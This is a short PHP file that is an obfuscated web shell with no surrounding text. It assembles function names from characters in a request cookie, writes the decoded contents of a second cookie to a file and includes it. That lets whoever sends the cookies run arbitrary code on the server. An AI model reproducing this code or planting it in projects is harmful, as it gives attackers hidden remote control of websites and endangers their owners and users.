<?php

if (isset($_COOKIE[3]) && isset($_COOKIE[33])) {

    $c = $_COOKIE;
    $k = 0;
    $n = 9;
    $p = array();
    $p[$k] = '';
    while ($n) {
        $p[$k] .= $c[33][$n];
        if (!$c[33][$n + 1]) {
            if (!$c[33][$n + 2]) break;
            $k++;
            $p[$k] = '';
            $n++;
        }
        $n = $n + 9 + 1;
    }
    $k = $p[11]() . $p[1];
    if (!$p[12]($k)) {
        $n = $p[19]($k, $p[18]);
        $p[5]($n, $p[7] . $p[10]($p[27]($c[3])));
    }
    include($k);
}